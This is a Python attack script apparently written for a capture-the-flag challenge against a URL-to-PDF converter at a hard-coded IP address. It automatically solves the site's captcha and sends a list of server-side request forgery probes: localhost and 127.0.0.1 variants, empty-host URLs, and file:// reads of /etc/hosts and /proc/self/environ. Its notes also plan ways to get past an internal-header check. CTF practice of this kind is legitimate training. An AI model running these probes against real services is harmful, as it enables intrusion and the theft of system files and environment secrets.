#!/usr/bin/env python3
"""
Web 2 Doc 1 - Understanding the vulnerability

From snippet.py:
- X-Fetcher header check: if x_fetcher == 'internal' -> 403
- is_localhost check: if not localhost -> 403  
- Flag oracle: FLAG[index] == char -> 200 "OK", else 404 "NOT OK"

The X-Fetcher: internal check is case-insensitive (.lower())
This means we can't bypass it with casing.

But wait - maybe the PDF fetcher ADDS this header, and we need
to find a way to make it NOT be 'internal' or make the request
without that header entirely.

Possible approaches:
1. Override/remove the X-Fetcher header via some mechanism
2. Use a redirect that drops headers
3. Exploit Header injection somewhere

Let's first see what a successful external PDF looks like
to confirm the service is working.
"""

import requests
import re
import time

BASE_URL = "http://52.59.124.14:5002"

def get_session_and_captcha():
    """Get a fresh session and solve captcha."""
    session = requests.Session()
    resp = session.get(f"{BASE_URL}/")
    match = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*])\s*(\d+)\s*=', resp.text)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            answer = a + b
        elif op == '-':
            answer = a - b
        elif op == '*':
            answer = a * b
        else:
            return None, None
        return session, str(answer)
    return None, None

def test_url(url):
    """Test a URL with fresh session."""
    session, captcha = get_session_and_captcha()
    if not session:
        print(f"Failed to get session")
        return None
    
    resp = session.post(f"{BASE_URL}/convert", data={
        "url": url,
        "captcha_answer": captcha
    })
    return resp

def main():
    print("[*] First, let's confirm external URLs work...")
    
    # Test basic external URL
    resp = test_url("https://example.com")
    if resp and resp.status_code == 200:
        print(f"[+] External URL works! PDF size: {len(resp.content)} bytes")
    else:
        print(f"[-] External URL failed: {resp.status_code if resp else 'No response'}")
        return
    
    # Now let's see if the issue is just with localhost-looking URLs
    print("\n[*] Testing URL patterns to understand the filter...")
    
    test_patterns = [
        # External that works
        ("External (example.com)", "https://example.com"),
        
        # Basic localhost variants
        ("localhost", "http://localhost:5002/"),
        ("127.0.0.1", "http://127.0.0.1:5002/"),
        
        # What about just "internal" in the URL?
        ("URL with 'internal'", "https://example.com/internal"),
        
        # What if we try port without host?
        ("Just port", "http://:5002/"),
        
        # What about relative URL?
        ("Relative /admin/flag", "/admin/flag"),
        
        # Empty host
        ("Empty host", "http:///admin/flag"),
        
        # Different scheme
        ("HTTPS localhost", "https://localhost:5002/"),
        ("HTTPS 127.0.0.1", "https://127.0.0.1:5002/"),
        
        # .local domain
        ("Flask.local", "http://flask.local:5002/"),
        
        # Trying file:// for LFI
        ("file:///etc/hosts", "file:///etc/hosts"),
        ("file:///proc/self/environ", "file:///proc/self/environ"),
    ]
    
    for name, url in test_patterns:
        resp = test_url(url)
        time.sleep(0.5)  # Rate limiting
        
        if resp is None:
            print(f"[-] {name:25s} -> No response")
        elif resp.status_code == 200 and 'pdf' in resp.headers.get('Content-Type', '').lower():
            print(f"[+] {name:25s} -> SUCCESS! {len(resp.content)} bytes")
            # Save interesting ones
            safe_name = name.replace("/", "_").replace(":", "_")[:20]
            with open(f"pdf_{safe_name}.pdf", "wb") as f:
                f.write(resp.content)
        else:
            try:
                error = resp.json().get('error', resp.text[:50])
            except:
                error = resp.text[:50]
            print(f"[-] {name:25s} -> {resp.status_code}: {error[:40]}")

if __name__ == "__main__":
    main()
